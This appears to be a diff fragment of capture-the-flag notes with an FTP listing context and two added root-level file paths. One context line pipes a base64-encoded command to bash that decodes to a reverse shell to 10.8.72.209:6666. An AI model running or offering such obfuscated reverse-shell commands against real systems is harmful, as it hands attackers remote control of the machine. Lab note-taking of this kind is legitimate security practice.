@@ -43,3 +43,7 @@ ftp> ls -la
 
 
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjcyLjIwOS82NjY2IDA+JjEK|base64 "-d|bash
+
+
+/root/flask/magiccat.py
+/root/root.txt
